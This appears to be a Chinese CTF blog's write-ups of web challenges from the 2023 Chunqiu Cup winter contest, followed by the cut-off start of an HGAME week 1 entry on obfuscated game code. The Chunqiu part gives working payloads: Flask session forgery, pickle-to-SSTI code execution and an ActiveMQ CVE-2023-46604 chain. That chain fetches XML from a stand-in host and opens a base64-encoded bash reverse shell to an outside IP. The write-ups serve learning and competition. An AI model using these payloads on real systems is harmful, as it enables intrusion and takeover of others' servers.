redirect(<span class="hljs-string">&quot;login.php&quot;</span>)    <span class="hljs-keyword">if</span> (pic := request.args.get(<span class="hljs-string">&#x27;pic&#x27;</span>)) <span class="hljs-keyword">and</span> os.path.isfile(filepath := <span class="hljs-string">&quot;./uploads/&quot;</span> + pic.replace(<span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)):        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;username&#x27;</span>) == <span class="hljs-string">&quot;admin&quot;</span>:            <span class="hljs-keyword">return</span> pickle.load(<span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">&quot;rb&quot;</span>))        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;&lt;img src=&quot;data:image/png;base64,&#x27;&#x27;&#x27;</span> + base64.b64encode(                <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">&quot;rb&quot;</span>).read()).decode() + <span class="hljs-string">&#x27;&#x27;&#x27;&quot;&gt;&#x27;&#x27;&#x27;</span>    res = <span class="hljs-string">&quot;&lt;h1&gt;files in ./uploads/&lt;/h1&gt;&lt;br&gt;&quot;</span>    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(<span class="hljs-string">&quot;./uploads&quot;</span>):        res += <span class="hljs-string">&quot;&lt;a href=&#x27;pic.php?pic=&quot;</span> + f + <span class="hljs-string">&quot;&#x27;&gt;./uploads/&quot;</span> + f + <span class="hljs-string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>    <span class="hljs-keyword">return</span> res<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#Users.py</span><span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> os<span class="hljs-keyword">class</span> <span class="hljs-title class_">Users</span>:    passwords=&#123;&#125;    <span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">self,username,password</span>):        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> self.passwords:            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.passwords)&gt;=<span class="hljs-number">3</span>:            <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(self.passwords.keys()):                <span class="hljs-keyword">if</span> u!=<span class="hljs-string">&quot;admin&quot;</span>:                    <span class="hljs-keyword">del</span> self.passwords[u]        self.passwords[username]=hashlib.md5(password.encode()).hexdigest()        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self,username,password</span>):        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> self.passwords <span class="hljs-keyword">and</span> self.passwords[username]==hashlib.md5(password.encode()).hexdigest():            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs vim"># waf.<span class="hljs-keyword">py</span>import osfrom werkzeug.utils import secure_filenamedef waf(<span class="hljs-keyword">file</span>):    content=<span class="hljs-keyword">file</span>.<span class="hljs-keyword">read</span>().lower()    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(content)&gt;=<span class="hljs-number">70</span>:        <span class="hljs-keyword">return</span> False    <span class="hljs-keyword">for</span> <span class="hljs-keyword">b</span> in [<span class="hljs-keyword">b</span><span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&quot;\r&quot;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&quot;\\&quot;,b&quot;</span>base<span class="hljs-string">&quot;,b&quot;</span>builtin<span class="hljs-string">&quot;,b&quot;</span>code<span class="hljs-string">&quot;,b&quot;</span><span class="hljs-keyword">command</span><span class="hljs-string">&quot;,b&quot;</span><span class="hljs-built_in">eval</span><span class="hljs-string">&quot;,b&quot;</span>exec<span class="hljs-string">&quot;,b&quot;</span>flag<span class="hljs-string">&quot;,b&quot;</span><span class="hljs-keyword">global</span><span class="hljs-string">&quot;,b&quot;</span>os<span class="hljs-string">&quot;,b&quot;</span>output<span class="hljs-string">&quot;,b&quot;</span>popen<span class="hljs-string">&quot;,b&quot;</span>pty<span class="hljs-string">&quot;,b&quot;</span><span class="hljs-built_in">repeat</span><span class="hljs-string">&quot;,b&quot;</span>run<span class="hljs-string">&quot;,b&quot;</span>setstate<span class="hljs-string">&quot;,b&quot;</span>spawn<span class="hljs-string">&quot;,b&quot;</span>subprocess<span class="hljs-string">&quot;,b&quot;</span>sys<span class="hljs-string">&quot;,b&quot;</span><span class="hljs-built_in">system</span><span class="hljs-string">&quot;,b&quot;</span>timeit<span class="hljs-comment">&quot;]:</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">b</span> in content:            <span class="hljs-keyword">return</span> False    <span class="hljs-keyword">file</span>.seek(<span class="hljs-number">0</span>)    <span class="hljs-keyword">return</span> secure_filename(<span class="hljs-keyword">file</span>.filename)</code></pre></div><p>register.php存在python格式化字符串漏洞</p><div class="code-wrapper"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/register.php&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])def <span class="hljs-built_in">register</span>():    if request.method == <span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-keyword">and</span> (<span class="hljs-attribute">username </span>:= request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;username&#x27;</span>)) <span class="hljs-keyword">and</span> (    <span class="hljs-attribute">password </span>:= request.form.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;password&#x27;</span>)):        if <span class="hljs-built_in">type</span>(username) == str <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(password) == str <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> username.<span class="hljs-built_in">isnumeric</span>() <span class="hljs-keyword">and</span> users.<span class="hljs-built_in">register</span>(username,                                                                                                           password):            str1 = <span class="hljs-string">&quot;Register successs! Your username is &#123;username&#125; with hash: &#123;&#123;users.passwords[&#123;username&#125;]&#125;&#125;.&quot;</span>.<span class="hljs-built_in">format</span>(                username=username).<span class="hljs-built_in">format</span>(users=users)            return str1        <span class="hljs-attribute">else</span>:            return <span class="hljs-string">&quot;Register fail!&quot;</span>    return <span class="hljs-built_in">render_template</span>(<span class="hljs-string">&quot;register.html&quot;</span>)</code></pre></div><p>注册username为<code>&#123;users.passwords&#125;</code>即可</p><p><img src="/../images/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/image-20240208024034779.png" alt="image-20240208024034779"></p><p>拿到admin的password后，拿他去进行session伪造</p><div class="code-wrapper"><pre><code class="hljs jboss-cli">flask-unsign <span class="hljs-params">--sign</span> <span class="hljs-params">--cookie</span> &#x27;&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;&#x27; <span class="hljs-params">--secret</span> 294f3d30bab18f91f5cfe2e23881f5eb</code></pre></div><p>成为admin后我们就要考虑如何进行pickle反序列化了</p><p>这里存在长度70的限制并且过滤了诸多关键字以及构造opcode的关键字符换行符<code>\n</code></p><p>这里看了WP，不太理解为什么绕过换行的方法是将<code>pickle.dumps</code>的<code>protocol</code>选项设置为4或5的版本</p><p><img src="/../images/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/image-20240208170137482.png" alt="image-20240208170137482"></p><p>然后eval，os等都被禁了</p><blockquote><p>结合题目环境存在任意文件上传点，且最为关键的一点是设置了flask app的模板渲染路径为<code>./</code>（也就是<code>/app</code>）</p></blockquote><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">app.template_folder</span>=<span class="hljs-string">&quot;./&quot;</span></code></pre></div><blockquote><p>我们上传文件的上传路径为<code>./uploads/</code>，所以我们上传的文件都可以被作为flask的模板文件进行渲染</p><p>代码中也引入调用了<code>render_template</code>函数对模板文件进行渲染</p><p>推断出所有的模板文件都是存放在<code>./</code>也就是<code>/app</code>目录下的</p><p>那我们自然也可以按照这个思路通过任意文件上传点上传一个恶意的可以实现模板注入SSTI的POC模板文件，然后再通过pickle反序列化调用<code>render_template</code>函数渲染它即可实现pickle to SSTI的攻击思路</p></blockquote><p>所以结论就是调用flask的内置函数<code>render_template</code></p><p>那这里SSTI的话，官方WP给了一个极限的payload</p><div class="code-wrapper"><pre><code class="hljs scss">&#123;&#123;lipsum<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__glob&#x27;</span><span class="hljs-string">&#x27;als__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__built&#x27;</span><span class="hljs-string">&#x27;ins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;ev&#x27;</span><span class="hljs-string">&#x27;al&#x27;</span>]</span>(request.data)&#125;&#125;</code></pre></div><p>长度为69</p><p>保存为<code>poc</code>文件后上传</p><p>然后是构造pickle反序列化    （他这里也没用到上面说的指定protocol为4或5啊。。。）</p><div class="code-wrapper"><pre><code class="hljs monkey"><span class="hljs-keyword">import</span> picklefrom flask <span class="hljs-keyword">import</span> render_template<span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span>():    def __reduce__(<span class="hljs-variable language_">self</span>):        <span class="hljs-keyword">return</span>(render_template,(<span class="hljs-string">&quot;uploads/poc&quot;</span>,))<span class="hljs-built_in">exp</span>=<span class="hljs-built_in">EXP</span>()f=open(<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)pickle.dump(<span class="hljs-built_in">exp</span>,f)</code></pre></div><p>得到生成的<code>exp</code>文件上传 （长度为69，也是非常极限。。。。。）</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/pic.php?pic=exp</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZYkoxw.oJOwM9sfFQlcG85g4BTN1d1lgfA<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>39<span class="language-stylus"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>)<span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<span class="hljs-selector-class">.read</span>()</span></code></pre></div><p><img src="/../images/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/image-20240208171703761.png" alt="image-20240208171703761"></p><p><img src="/../images/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/image-20240208171717817.png" alt="image-20240208171717817"></p><p><img src="/../images/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/image-20240208171738225.png" alt="image-20240208171738225"></p><h3 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h3><p>文件包含处多尝试，去猜测他的waf点</p><p>关键的使用render_template函数我应该不太能想到，不知道咋办</p><p>整体上操作不难，但是几个关键点想不到都会原地爆炸</p><h2 id="Active-Takeaway"><a href="#Active-Takeaway" class="headerlink" title="Active-Takeaway"></a><strong>Active-Takeaway</strong></h2><p>看名字就知道和ActiveMQ有关</p><p>实例化任意构造器，参数为String类，经典ActiveMQ漏洞</p><p><img src="/../images/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/image-20240208173926122.png" alt="image-20240208173926122"></p><p>有个filter，用分号绕过？</p><p><img src="/../images/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/image-20240208213718843.png" alt="image-20240208213718843"></p><p>好，没发现其他地方，根本没有思路，WP启动</p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p><img src="/../images/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/image-20240208224856033.png" alt="image-20240208224856033"></p><p>嗯嗯，没错符合猜想</p><p><img src="/../images/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B-web/image-20240208225000929.png" alt="image-20240208225000929"></p><p>？我咋找不到，用了jadx全局搜索，找到在org.example包下。。。。藏成这样？  服了</p><p>经过对WP的理解和搭建activemq环境过程中的发掘，我才理解这是一段点对点模式的长连接代码</p><p>那这里我们就能够从broker打到consumer</p><p>简单描述原理就是像官方WP中所说的</p><blockquote><p>在activemq中的org.apache.activemq.broker.BrokerRegistry#getInstance里可以拿到和broker保持长连接的merchant线程。拿到这个线程向merchant发包打一遍CVE-2023-46604即可</p></blockquote><p>这里我们不用官方WP中那么复杂，我们直接加载的xml文件内容为以js代码来执行代码</p><p>但原理是一样的，都是通过broker的机子执行恶意代码进而控制merchant的机子</p><p>详细原理看文章<a href="https://www.yulegeyu.com/">雨了个雨’s blog (yulegeyu.com)</a></p><div class="code-wrapper"><pre><code class="hljs scilab">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;&lt;beans xmlns=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span>       xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>       xmlns:context=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span>       xsi:schemaLocation=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd</span><span class="hljs-string">            http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd&quot;</span>&gt;    &lt;context:property-placeholder ignore-resource-not-found=<span class="hljs-string">&quot;false&quot;</span> ignore-unresolvable=<span class="hljs-string">&quot;false&quot;</span>/&gt;    &lt;bean class=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;        &lt;property name=<span class="hljs-string">&quot;String&quot;</span> value=<span class="hljs-string">&quot;#&#123;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#x27;</span>js&#x27;).eval(&amp;quot;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getunsafe</span><span class="hljs-params">()</span> &#123;<span class="hljs-title">var</span> <span class="hljs-title">unsafe</span> = <span class="hljs-title">java</span>.<span class="hljs-title">lang</span>.<span class="hljs-title">Class</span>.<span class="hljs-title">forName</span><span class="hljs-params">(&#x27;sun.misc.Unsafe&#x27;)</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;theUnsafe&#x27;)</span>;<span class="hljs-title">unsafe</span>.<span class="hljs-title">setAccessible</span><span class="hljs-params">(true)</span>;<span class="hljs-title">return</span> <span class="hljs-title">unsafe</span>.<span class="hljs-title">get</span><span class="hljs-params">(null)</span>;&#125; <span class="hljs-title">var</span> <span class="hljs-title">unsafe</span> = <span class="hljs-title">getunsafe</span><span class="hljs-params">()</span>; <span class="hljs-title">brokerRegistry</span> = <span class="hljs-title">org</span>.<span class="hljs-title">apache</span>.<span class="hljs-title">activemq</span>.<span class="hljs-title">broker</span>.<span class="hljs-title">BrokerRegistry</span>.<span class="hljs-title">getInstance</span><span class="hljs-params">()</span>;<span class="hljs-title">brokers</span> = <span class="hljs-title">brokerRegistry</span>.<span class="hljs-title">getBrokers</span><span class="hljs-params">()</span>;<span class="hljs-title">for</span><span class="hljs-params">(key in brokers)</span>&#123;   <span class="hljs-title">brokerService</span> = <span class="hljs-title">brokers</span>.<span class="hljs-title">get</span><span class="hljs-params">(key)</span>;  <span class="hljs-title">try</span>&#123; <span class="hljs-title">f</span> = <span class="hljs-title">brokerService</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;shutdownHook&#x27;)</span>; &#125;<span class="hljs-title">catch</span><span class="hljs-params">(e)</span>&#123;<span class="hljs-title">f</span> = <span class="hljs-title">brokerService</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getSuperclass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;shutdownHook&#x27;)</span>;&#125;   <span class="hljs-title">f</span>.<span class="hljs-title">setAccessible</span><span class="hljs-params">(true)</span>;   <span class="hljs-title">shutdownHook</span> = <span class="hljs-title">f</span>.<span class="hljs-title">get</span><span class="hljs-params">(brokerService)</span>;   <span class="hljs-title">threadGroup</span> = <span class="hljs-title">shutdownHook</span>.<span class="hljs-title">getThreadGroup</span><span class="hljs-params">()</span>;   <span class="hljs-title">f</span> = <span class="hljs-title">threadGroup</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;threads&#x27;)</span>; <span class="hljs-title">threads</span> = <span class="hljs-title">unsafe</span>.<span class="hljs-title">getObject</span><span class="hljs-params">(threadGroup, unsafe.objectFieldOffset(f)</span>); <span class="hljs-title">for</span><span class="hljs-params">(key in threads)</span>&#123;       <span class="hljs-title">thread</span> = <span class="hljs-title">threads</span>[<span class="hljs-title">key</span>];       <span class="hljs-title">if</span><span class="hljs-params">(thread == null)</span>&#123;           <span class="hljs-title">continue</span>;       &#125;       <span class="hljs-title">threadName</span> = <span class="hljs-title">thread</span>.<span class="hljs-title">getName</span><span class="hljs-params">()</span>;       <span class="hljs-title">if</span><span class="hljs-params">(threadName.startsWith(&#x27;ActiveMQ Transport: &#x27;)</span>)&#123;           <span class="hljs-title">f</span> = <span class="hljs-title">thread</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;target&#x27;)</span>;                      <span class="hljs-title">tcpTransport</span> = <span class="hljs-title">unsafe</span>.<span class="hljs-title">getObject</span><span class="hljs-params">(thread, unsafe.objectFieldOffset(f)</span>);           <span class="hljs-title">f</span> = <span class="hljs-title">tcpTransport</span>.<span class="hljs-title">getClass</span><span class="hljs-params">()</span>.<span class="hljs-title">getDeclaredField</span><span class="hljs-params">(&#x27;socket&#x27;)</span>;           <span class="hljs-title">f</span>.<span class="hljs-title">setAccessible</span><span class="hljs-params">(true)</span>;           <span class="hljs-title">socket</span> = <span class="hljs-title">f</span>.<span class="hljs-title">get</span><span class="hljs-params">(tcpTransport)</span>;           <span class="hljs-title">bos</span> = <span class="hljs-title">new</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">ByteArrayOutputStream</span><span class="hljs-params">()</span>;           <span class="hljs-title">dataOutput</span> = <span class="hljs-title">new</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">DataOutputStream</span><span class="hljs-params">(bos)</span>;           <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeInt</span><span class="hljs-params">(1)</span>;           <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeByte</span><span class="hljs-params">(31)</span>;    <span class="hljs-title">bs</span> = <span class="hljs-title">new</span> <span class="hljs-title">org</span>.<span class="hljs-title">apache</span>.<span class="hljs-title">activemq</span>.<span class="hljs-title">openwire</span>.<span class="hljs-title">BooleanStream</span><span class="hljs-params">()</span>;    <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(false)</span>;   <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(true)</span>; <span class="hljs-title">bs</span>.<span class="hljs-title">writeBoolean</span><span class="hljs-params">(false)</span>;  <span class="hljs-title">bs</span>.<span class="hljs-title">marshal</span><span class="hljs-params">(dataOutput)</span>; <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;bb&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;aa&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeUTF</span><span class="hljs-params">(&#x27;http://vps_ip:8000/dddd&#x27;)</span>;  <span class="hljs-title">dataOutput</span>.<span class="hljs-title">writeShort</span><span class="hljs-params">(0)</span>;  <span class="hljs-title">socketOutputStream</span> = <span class="hljs-title">socket</span>.<span class="hljs-title">getOutputStream</span><span class="hljs-params">()</span>;           <span class="hljs-title">socketOutputStream</span>.<span class="hljs-title">write</span><span class="hljs-params">(bos.toByteArray()</span>);         &#125;   &#125;   &#125;&amp;<span class="hljs-title">quot</span>;)&#125;&quot;/&gt;</span>    &lt;/bean&gt;&lt;/beans&gt;</code></pre></div><p>代码中的<code>http://vps_ip:8000/dddd</code>为反弹shell的xml文件</p><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span></span><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span></span><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span></span><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span></span><span class="hljs-template-variable">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguODkuNjEuNzEvNzc3NyAwPiYx&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="hljs-template-variable">&#123;bash,-i&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span></span><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></span></code></pre></div><p>这样即可</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://boogipop.com/2024/01/25/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B%20Web%20Writeup/">https://boogipop.com/2024/01/25/2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9B%20Web%20Writeup/</a></p><p><a href="https://www.ctfiot.com/159161.html">【WP】2023年春秋杯冬季赛WEB、PWN类题目解析 | CTF导航 (ctfiot.com)</a></p><p><a href="https://www.yulegeyu.com/">雨了个雨’s blog (yulegeyu.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HGAME-WEEK1</title>
    <link href="/2024/02/04/HGAME-WEEK1/"/>
    <url>/2024/02/04/HGAME-WEEK1/</url>
    
    <content type="html"><![CDATA[<h1 id="HGAME-WEEK1"><a href="#HGAME-WEEK1" class="headerlink" title="HGAME-WEEK1"></a>HGAME-WEEK1</h1><p>web 4&#x2F;5</p><p><img src="/../images/HGAME-WEEK1/image-20240215210138158.png" alt="image-20240215210138158"></p><h2 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h2><p>混淆太厉害了，刚开始一直想修改变量值，但是它是动态的，改不成功，只能改bestScore</p><p>最后审计代码，发现关键部分</p><p>因为它是混淆过的，所以我刚开始几次路过这个地方都不太理解，感觉再难一点就把<code>game-won</code>也放到定义的数组里去混淆了</p><div class="code-wrapper"><pre><code class="hljs excel">g[h(<span class="hljs-number">432</span>)][h(<span class="hljs-number">469</span>)] = function(x) &#123;    <span class="hljs-built_in">var</span> <span class="hljs-built_in">n</span> = h      , e = x ? <span class="hljs-string">&quot;game-won&quot;</span> <span class="hljs-symbol">:</span> <span class="hljs-built_in">n</span>(<span class="hljs-comment">443</span>)      , <span class="hljs-built_in">t</span> = x ? <span class="hljs-symbol">s0</span>(<span class="hljs-built_in">n</span>(<span class="hljs-comment">439</span>), <span class="hljs-string">&quot;V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3&quot;</span>) <span class="hljs-symbol">:</span> <span class="hljs-built_in">n</span>(<span class="hljs-comment">453</span>);    this[<span class="hljs-built_in">n</span>(<span class="hljs-comment">438</span>)][<span class="hljs-built_in">n</span>(<span class="hljs-comment">437</span>)].add(e),    this[<span class="hljs-built_in">n</span>(<span class="hljs-comment">438</span>)][<span class="hljs-built_in">n</span>(<span class="hljs-comment">435</span>)](<span class="hljs-string">&quot;p&quot;</span>)[-<span class="hljs-number">1257</span> * -<span class="hljs-number">5</span> + <span class="hljs-number">9</span> * <span class="hljs-number">1094</span> + -<span class="hljs-number">5377</span> * <span class="hljs-number">3</span>].textContent = <span class="hljs-built_in">t</span>&#125;</code></pre></div><p>都提示了game-won，那下面这个就是flag</p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">s0</span><span class="hljs-params">(n(<span class="hljs-number">439</span>)</span></span>, <span class="hljs-string">&quot;V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3&quot;</span>)</code></pre></div><div class="code-wrapper"><pre><code class="hljs subunit">function s0(x, n) &#123;    for (var e = h, t = 36 * 52 + <span class="hljs-string">-590</span> + <span class="hljs-string">-1282</span>, r, a, o = <span class="hljs-string">-1</span> * <span class="hljs-string">-1971</span> + <span class="hljs-string">-678</span> + <span class="hljs-string">-1293</span>, c = &quot;&quot;; a = x[e(442)](o++); ~a &amp;&amp; (r = t % (<span class="hljs-string">-1</span> * 445 + <span class="hljs-string">-324</span> + <span class="hljs-string">-1</span> * <span class="hljs-string">-773</span>) ? r * (<span class="hljs-string">-64</span> * 33 + <span 